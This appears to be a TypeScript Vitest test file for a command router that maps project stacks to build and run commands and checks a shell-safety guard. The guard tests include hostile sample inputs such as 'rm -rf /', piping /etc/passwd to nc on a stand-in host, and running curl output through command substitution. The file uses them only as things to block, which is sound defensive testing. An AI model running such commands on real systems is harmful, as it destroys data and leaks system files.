import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  commandFor,
  deriveCommand,
  detectStack,
  expectedPortFor,
  isDevServerCommand,
  isUnsafeShellCommand,
} from "../../src/intent-router/handlers/command.js";

// v15.7 (2026-05-27): detectIntentKind regex KALDIRILDI — kind UI tarafında
// belirlenip caller'a verilir. Eski "regex parse text" testleri silindi;
// `deriveCommand` artık explicit `kind` parametresi alır.

describe("intent-router/command · commandFor (pure stack → command map)", () => {
  it("Node npm: install/test default + dev script var", () => {
    expect(commandFor("node-npm", "install")).toBe("npm install");
    expect(commandFor("node-npm", "test")).toBe("npm test");
    expect(commandFor("node-npm", "run", { dev: "vite" })).toBe("npm run dev");
    expect(commandFor("node-npm", "run", { start: "node server" })).toBe("npm run start");
    expect(commandFor("node-npm", "run")).toBeNull();
    expect(commandFor("node-npm", "build", { build: "tsc" })).toBe("npm run build");
    expect(commandFor("node-npm", "build")).toBeNull();
    expect(commandFor("node-npm", "lint", { lint: "eslint ." })).toBe("npm run lint");
  });

  it("Node yarn/pnpm/bun: paket yöneticisi doğru prefix", () => {
    expect(commandFor("node-yarn", "install")).toBe("yarn install");
    expect(commandFor("node-yarn", "test")).toBe("yarn test");
    expect(commandFor("node-yarn", "run", { dev: "x" })).toBe("yarn run dev");
    expect(commandFor("node-pnpm", "install")).toBe("pnpm install");
    expect(commandFor("node-pnpm", "test")).toBe("pnpm test");
    expect(commandFor("node-bun", "install")).toBe("bun install");
    expect(commandFor("node-bun", "test")).toBe("bun run test");
  });

  it("Rust", () => {
    expect(commandFor("rust", "run")).toBe("cargo run");
    expect(commandFor("rust", "test")).toBe("cargo test");
    expect(commandFor("rust", "build")).toBe("cargo build");
    expect(commandFor("rust", "install")).toBe("cargo fetch");
    expect(commandFor("rust", "lint")).toBe("cargo clippy");
  });

  it("Python (poetry/uv/pip)", () => {
    expect(commandFor("python-poetry", "install")).toBe("poetry install");
    expect(commandFor("python-poetry", "test")).toBe("poetry run pytest");
    expect(commandFor("python-uv", "install")).toBe("uv sync");
    expect(commandFor("python-uv", "test")).toBe("uv run pytest");
    expect(commandFor("python-pip", "install")).toBe("pip install -r requirements.txt");
    expect(commandFor("python-pip", "test")).toBe("pytest");
  });

  it("Go", () => {
    expect(commandFor("go", "run")).toBe("go run .");
    expect(commandFor("go", "test")).toBe("go test ./...");
    expect(commandFor("go", "build")).toBe("go build ./...");
    expect(commandFor("go", "install")).toBe("go mod download");
  });

  it("Ruby / PHP / Maven / Gradle / Elixir / Dart / Swift / .NET / Deno", () => {
    expect(commandFor("ruby", "install")).toBe("bundle install");
    expect(commandFor("php", "install")).toBe("composer install");
    expect(commandFor("maven", "test")).toBe("mvn test");
    expect(commandFor("gradle", "build")).toBe("./gradlew build");
    expect(commandFor("elixir", "install")).toBe("mix deps.get");
    expect(commandFor("dart", "run")).toBe("flutter run");
    expect(commandFor("swift", "build")).toBe("swift build");
    expect(commandFor("dotnet", "test")).toBe("dotnet test");
    expect(commandFor("deno", "test")).toBe("deno test");
  });

  it("unknown stack → null", () => {
    expect(commandFor("unknown", "run")).toBeNull();
    expect(commandFor("unknown", "test")).toBeNull();
  });
});

describe("intent-router/command · detectStack + deriveCommand (FS integration)", () => {
  let tmpRoot: string;

  beforeEach(() => {
    tmpRoot = mkdtempSync(join(tmpdir(), "mycl-cmd-test-"));
  });
  afterEach(() => {
    rmSync(tmpRoot, { recursive: true, force: true });
  });

  it("package.json yok → unknown stack", () => {
    expect(detectStack(tmpRoot)).toBe("unknown");
  });

  it("package.json varsa node-npm (lock dosyası yok)", () => {
    writeFileSync(join(tmpRoot, "package.json"), JSON.stringify({ name: "x" }));
    expect(detectStack(tmpRoot)).toBe("node-npm");
  });

  it("pnpm-lock.yaml + package.json → node-pnpm", () => {
    writeFileSync(join(tmpRoot, "package.json"), JSON.stringify({ name: "x" }));
    writeFileSync(join(tmpRoot, "pnpm-lock.yaml"), "");
    expect(detectStack(tmpRoot)).toBe("node-pnpm");
  });

  it("Cargo.toml → rust", () => {
    writeFileSync(join(tmpRoot, "Cargo.toml"), "[package]\nname=\"x\"");
    expect(detectStack(tmpRoot)).toBe("rust");
  });

  it("pyproject.toml + tool.poetry → python-poetry", () => {
    writeFileSync(join(tmpRoot, "pyproject.toml"), "[tool.poetry]\nname=\"x\"");
    expect(detectStack(tmpRoot)).toBe("python-poetry");
  });

  it("pyproject.toml + uv.lock → python-uv", () => {
    writeFileSync(join(tmpRoot, "pyproject.toml"), "[project]\nname=\"x\"");
    writeFileSync(join(tmpRoot, "uv.lock"), "");
    expect(detectStack(tmpRoot)).toBe("python-uv");
  });

  it("requirements.txt → python-pip", () => {
    writeFileSync(join(tmpRoot, "requirements.txt"), "requests==2.0");
    expect(detectStack(tmpRoot)).toBe("python-pip");
  });

  it("go.mod → go", () => {
    writeFileSync(join(tmpRoot, "go.mod"), "module x");
    expect(detectStack(tmpRoot)).toBe("go");
  });

  it(".csproj → dotnet", () => {
    writeFileSync(join(tmpRoot, "App.csproj"), "<Project/>");
    expect(detectStack(tmpRoot)).toBe("dotnet");
  });

  it("deriveCommand: hint öncelikli (stack tespitini bypass eder)", () => {
    expect(deriveCommand(tmpRoot, null, "make build")).toBe("make build");
  });

  it("deriveCommand: Node + dev script → npm run dev", () => {
    writeFileSync(
      join(tmpRoot, "package.json"),
      JSON.stringify({ name: "x", scripts: { dev: "vite" } }),
    );
    expect(deriveCommand(tmpRoot, "run")).toBe("npm run dev");
    expect(deriveCommand(tmpRoot, "test")).toBe("npm test");
  });

  it("deriveCommand: Rust projesi → cargo komutları", () => {
    writeFileSync(join(tmpRoot, "Cargo.toml"), "[package]\nname=\"x\"");
    expect(deriveCommand(tmpRoot, "run")).toBe("cargo run");
    expect(deriveCommand(tmpRoot, "test")).toBe("cargo test");
    expect(deriveCommand(tmpRoot, "build")).toBe("cargo build");
  });

  it("deriveCommand: Python (uv) → uv komutları", () => {
    writeFileSync(join(tmpRoot, "pyproject.toml"), "[project]\nname=\"x\"");
    writeFileSync(join(tmpRoot, "uv.lock"), "");
    expect(deriveCommand(tmpRoot, "install")).toBe("uv sync");
    expect(deriveCommand(tmpRoot, "test")).toBe("uv run pytest");
  });

  it("deriveCommand: Go projesi", () => {
    writeFileSync(join(tmpRoot, "go.mod"), "module x");
    expect(deriveCommand(tmpRoot, "run")).toBe("go run .");
    expect(deriveCommand(tmpRoot, "build")).toBe("go build ./...");
  });

  it("deriveCommand: unknown stack + kind verilse de null", () => {
    // mkdir ama hiçbir manifest yazma — stack 'unknown' olur
    mkdirSync(join(tmpRoot, "subdir"));
    expect(deriveCommand(tmpRoot, "run")).toBeNull();
  });

  it("deriveCommand: kind null + hint yok → null (caller hata göstermeli)", () => {
    writeFileSync(
      join(tmpRoot, "package.json"),
      JSON.stringify({ name: "x" }),
    );
    expect(deriveCommand(tmpRoot, null)).toBeNull();
  });
});

describe("intent-router/command · isDevServerCommand (multi-stack web server)", () => {
  it("Node dev/start scripts (npm/yarn/pnpm/bun)", () => {
    expect(isDevServerCommand("npm run dev")).toBe(true);
    expect(isDevServerCommand("yarn run dev")).toBe(true);
    expect(isDevServerCommand("pnpm run start")).toBe(true);
    expect(isDevServerCommand("bun run dev")).toBe(true);
    expect(isDevServerCommand("npx vite")).toBe(true);
    expect(isDevServerCommand("vite")).toBe(true);
    expect(isDevServerCommand("next dev")).toBe(true);
    expect(isDevServerCommand("webpack-dev-server")).toBe(true);
  });

  it("Python web framework'leri", () => {
    expect(isDevServerCommand("uvicorn main:app --reload")).toBe(true);
    expect(isDevServerCommand("gunicorn app:wsgi")).toBe(true);
    expect(isDevServerCommand("hypercorn main:app")).toBe(true);
    expect(isDevServerCommand("flask run")).toBe(true);
    expect(isDevServerCommand("python manage.py runserver")).toBe(true);
  });

  it("Ruby web framework'leri", () => {
    expect(isDevServerCommand("bundle exec rails server")).toBe(true);
    expect(isDevServerCommand("rails s")).toBe(true);
    expect(isDevServerCommand("bundle exec puma")).toBe(true);
  });

  it("PHP / Elixir / JVM / .NET", () => {
    expect(isDevServerCommand("php -S localhost:8000")).toBe(true);
    expect(isDevServerCommand("php artisan serve")).toBe(true);
    expect(isDevServerCommand("mix phx.server")).toBe(true);
    expect(isDevServerCommand("mvn spring-boot:run")).toBe(true);
    expect(isDevServerCommand("./gradlew bootRun")).toBe(true);
    expect(isDevServerCommand("dotnet run")).toBe(true);
    expect(isDevServerCommand("dotnet watch run")).toBe(true);
  });

  it("CLI / build / test komutları → false (dev server değil)", () => {
    expect(isDevServerCommand("cargo run")).toBe(false);
    expect(isDevServerCommand("go run .")).toBe(false);
    expect(isDevServerCommand("swift run")).toBe(false);
    expect(isDevServerCommand("npm test")).toBe(false);
    expect(isDevServerCommand("cargo build")).toBe(false);
    expect(isDevServerCommand("mvn test")).toBe(false);
  });
});

describe("intent-router/command · expectedPortFor (framework default port)", () => {
  it("Node frameworkler", () => {
    expect(expectedPortFor("npm run dev")).toBe(5173);
    expect(expectedPortFor("npx vite")).toBe(5173);
    expect(expectedPortFor("next dev")).toBe(3000);
  });

  it("Python", () => {
    expect(expectedPortFor("uvicorn main:app")).toBe(8000);
    expect(expectedPortFor("gunicorn app:wsgi")).toBe(8000);
    expect(expectedPortFor("flask run")).toBe(5000);
    expect(expectedPortFor("python manage.py runserver")).toBe(8000);
  });

  it("Ruby Rails / Puma", () => {
    expect(expectedPortFor("rails s")).toBe(3000);
    expect(expectedPortFor("bundle exec rails server")).toBe(3000);
    expect(expectedPortFor("bundle exec puma")).toBe(9292);
  });

  it("PHP built-in port'u command line'dan okur", () => {
    expect(expectedPortFor("php -S localhost:9001")).toBe(9001);
    expect(expectedPortFor("php -S 0.0.0.0:8080")).toBe(8080);
    expect(expectedPortFor("php artisan serve")).toBe(8000);
  });

  it("Elixir Phoenix / Spring Boot / .NET", () => {
    expect(expectedPortFor("mix phx.server")).toBe(4000);
    expect(expectedPortFor("mvn spring-boot:run")).toBe(8080);
    expect(expectedPortFor("./gradlew bootRun")).toBe(8080);
    expect(expectedPortFor("dotnet run")).toBe(5000);
  });

  it("tanınmayan komut → 8080 fallback", () => {
    expect(expectedPortFor("./my-custom-server")).toBe(8080);
    expect(expectedPortFor("make serve")).toBe(8080);
  });
});

describe("intent-router/command · isUnsafeShellCommand (security guard)", () => {
  it("güvenli komutlar → false (normal flag/path/port)", () => {
    expect(isUnsafeShellCommand("npm run dev")).toBe(false);
    expect(isUnsafeShellCommand("php -S localhost:8000")).toBe(false);
    expect(isUnsafeShellCommand("uvicorn main:app --reload --port 8000")).toBe(false);
    expect(isUnsafeShellCommand("cargo build --release")).toBe(false);
    expect(isUnsafeShellCommand("./gradlew bootRun")).toBe(false);
    expect(isUnsafeShellCommand("dotnet watch run")).toBe(false);
    expect(isUnsafeShellCommand("python manage.py runserver 0.0.0.0:8000")).toBe(false);
  });

  it("zincirleme komutlar → true", () => {
    expect(isUnsafeShellCommand("npm test ; rm -rf /")).toBe(true);
    expect(isUnsafeShellCommand("npm test && echo done")).toBe(true);
    expect(isUnsafeShellCommand("npm test || cargo build")).toBe(true);
  });

  it("pipe / redirect → true", () => {
    expect(isUnsafeShellCommand("cat /etc/passwd | nc evil 1337")).toBe(true);
    expect(isUnsafeShellCommand("npm run dev > /etc/hosts")).toBe(true);
    expect(isUnsafeShellCommand("python main.py < input.txt")).toBe(true);
  });

  it("backtick / command substitution → true", () => {
    expect(isUnsafeShellCommand("echo `whoami`")).toBe(true);
    expect(isUnsafeShellCommand('python -c "$(curl evil)"')).toBe(true);
  });

  it("background (&) → true", () => {
    expect(isUnsafeShellCommand("npm run dev & sleep 10")).toBe(true);
  });
});
